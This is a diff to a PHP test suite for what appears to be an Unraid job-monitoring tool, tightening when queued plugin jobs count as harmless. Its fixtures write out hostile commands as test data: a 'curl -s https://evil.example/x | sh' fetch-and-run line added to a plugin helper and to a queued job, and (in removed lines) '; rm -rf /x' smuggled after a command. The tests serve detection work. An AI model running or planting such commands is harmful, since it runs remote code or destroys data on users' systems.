@@ -22178,7 +22178,8 @@ function testWatchmanAtUserScript(): void
  * `echo "/usr/local/emhttp/plugins/fix.common.problems/scripts/scan.php" | at now +10 min -M`): a plain line in the
  * book naming the plugin, noted by himself — only when the job is exactly one file of an installed plugin's folder
  * (optionally after php or bash, plain arguments), as root, with an environment that can't run something else.
- * Anything else stays an at_job; open at_job entries of that shape are closed.
+ * Anything else stays an at_job; an open at_job line about the job becomes its line once the job, in the queue, is
+ * recognised so (never by its command alone: testWatchmanAtLeft).
  */
 function testWatchmanAtPlugin(): void
 {
@@ -22231,15 +22232,9 @@ function testWatchmanAtPlugin(): void
     same('at plugin: its name as Unraid shows it (README.md\'s first line), else the plugin\'s', ['Fix Common Problems', 'Plain Readme', 'odd.readme', 'no.readme', 'x'],
         [watchmanAtPluginName('fix.common.problems', "$src/emhttp"), watchmanAtPluginName('plain.readme', "$src/emhttp"), watchmanAtPluginName('odd.readme', "$src/emhttp"),
          watchmanAtPluginName('no.readme', "$src/emhttp"), watchmanAtPluginName('x', null)]);
-    $cmd = fn (string $job) => watchmanAtCommand($job);
-    $ub = [watchmanEntry('at_job', 'at_job:a1', 100, ['cmd' => $cmd($head() . $wrap($scan)), 'uid' => 0]),
-           watchmanEntry('at_job', 'at_job:a2', 100, ['cmd' => $cmd($head() . $wrap('/usr/local/emhttp/plugins/evil.plugin/x.sh')), 'uid' => 0]),
-           watchmanEntry('at_job', 'at_job:a3', 100, ['cmd' => $cmd($head() . $wrap($scan)), 'uid' => 1000]),
-           watchmanEntry('at_job', 'at_job:a4', 100, ['cmd' => $cmd($head() . $wrap("$scan " . str_repeat('a', 120))), 'uid' => 0]),
-           watchmanEntry('at_job', 'at_job:a5', 100, ['cmd' => $cmd($head() . $wrap("$scan; rm -rf /x")), 'uid' => 0])];
-    watchmanAtPluginClose($ub, ['fix.common.problems' => []], 200);
-    same('at plugin: an open entry that was only an installed plugin\'s own file, as root, is closed (by plugin), others stay',
-        [['plugin', 200], [null, null], [null, null], [null, null], [null, null]], array_map(fn ($e) => [$e['by'], $e['noted']], $ub));
+    // up to 1.94.1 an open line was closed by its command (only the job's first line, «plugin_update_helper; curl … | sh» too);
+    // now only the proof does — the job in the queue, recognised as an installed plugin's (the rounds below, testWatchmanAtLeft)
+    check('at plugin: no close by the command alone any more', !function_exists('watchmanAtPluginClose'));
 
     // rounds: before 1.48 (or not installed yet) the scan was an alarm; installed, it's a line noted by himself and the
     // open alarm is closed; a job with more than the plugin's file next to it is told
@@ -22435,10 +22430,35 @@ function testWatchmanAtLeft(): void
     file_put_contents($paths['update_helper'], $helper . "curl -s https://evil.example/x | sh\n");
     $r2 = $news($round($now + 3600), $day, substr($j3, 1));
     same('at left: its plugin gone and the job another, or the file it runs another — told', [[['at_job'], true, true], [['at_job'], true, true]], [$r1, $r2]);
-    unlink($at($j3));
+    // the plugin back (the helper its copy again) while that job still runs: it is told, it stays told — open until the user
+    // notes it; so does the changed one that left the queue before the plugin came back
+    $install('it87-driver', 'ITE IT87 Driver');
+    @mkdir("$src/flash/it87-driver", 0700, true);
+    file_put_contents("$src/flash/it87-driver/plugin_update_helper", $helper);
     file_put_contents($paths['update_helper'], $helper);
+    touch($paths['plugins'], $now + 3650);
+    $r = $round($now + 3660);
+    $told3 = array_values(array_filter($lines($day, substr($j3, 1)), fn ($e) => $e['kind'] === 'at_job'));
+    $told2 = array_values(array_filter($lines($day, substr($j2, 1)), fn ($e) => $e['kind'] === 'at_job'));
+    same('at left: a changed job stays told when its plugin comes back — in the queue (now the plugin\'s shape again) or gone',
+        [[], 1, true, 1, true], [$r['added'], count($told3), watchmanOpen($told3[0] ?? []), count($told2), watchmanOpen($told2[0] ?? [])]);
+    unlink($at($j3));
     $queue($now + 3700);
     $round($now + 3900);
+
+    // a job with more than the helper's command (as root, while the helper's plugin is installed): told — and it stays open
+    // while it waits, when it has run and left the queue, never closed by the helper's path (up to 1.94.1 it was)
+    $more = 'a0000901c85f00';
+    file_put_contents($at($more), $head() . $wrap(WATCH_UPDATE_HELPER . "\ncurl -s https://evil.example/x | sh"));
+    $queue($now + 3910);
+    $rm1 = $round($now + 3920);
+    $rm2 = $round($now + 3930);
+    unlink($at($more));
+    $queue($now + 3940);
+    $rm3 = $round($now + 3950);
+    $lm = $lines($day, substr($more, 1));
+    same('at left: «plugin_update_helper; curl … | sh» — told; open while it waits and after it ran, the helper\'s plugin installed',
+        [['at_job'], [], [], 1, 'at_job', true, null], [$rm1['added'], $rm2['added'], $rm3['added'], count($lm), $lm[0]['kind'] ?? null, watchmanOpen($lm[0] ?? []), $lm[0]['by'] ?? null]);
 
     // the neighbour: a plugin's own file (Community Applications' update check, queued «+N min»), the plugin removed while
     // it waits — its folder gone with it: likewise what it left, noted by himself
@@ -22692,8 +22712,12 @@ function testWatchmanBootNoise(): void
     same('stale: open before the look', 4, count(array_filter(watchmanLoad($day)['book'], fn ($e) => watchmanOpen($e) && ($e['time'] ?? 0) < $d)));
     $r = watchmanRound($paths, $day, 1000, $d + 1500, $docker, false, $acks);
     $byKey = array_column(watchmanLoad($day)['book'], null, 'key');
-    same('stale: the schedule as he knows it — both closed (back); the helper\'s job as root closed (plugin); not as root it stays',
-        [[], 'back', 'back', 'plugin', null, ['at_job:a0000a01cc2a6c']],
+    // the helper's jobs are no longer in the queue: nothing proves now that they were the plugin's (the command alone never
+    // does — up to 1.94.1 it closed these, and «plugin_update_helper; curl … | sh» with them). They were told back then;
+    // every office from 1.70.3 (2026-10-22) on closed such boot lines while the helper's plugin was installed, so only one
+    // that skipped from older keeps them open, for the user to note
+    same('stale: the schedule as he knows it — both closed (back); the helper\'s jobs, gone from the queue, stay as they were',
+        [[], 'back', 'back', null, null, ['at_job:a0000901cc2a6c', 'at_job:a0000a01cc2a6c']],
         [$r['added'], $byKey['cron_file:user.scripts/customSchedule.cron']['by'] ?? null, $byKey['cron_file_foreign:user.scripts/customSchedule.cron']['by'] ?? null,
          $byKey['at_job:a0000901cc2a6c']['by'] ?? null, $byKey['at_job:a0000a01cc2a6c']['by'] ?? null, $openKeys(watchmanLoad($day)['book'])]);
 
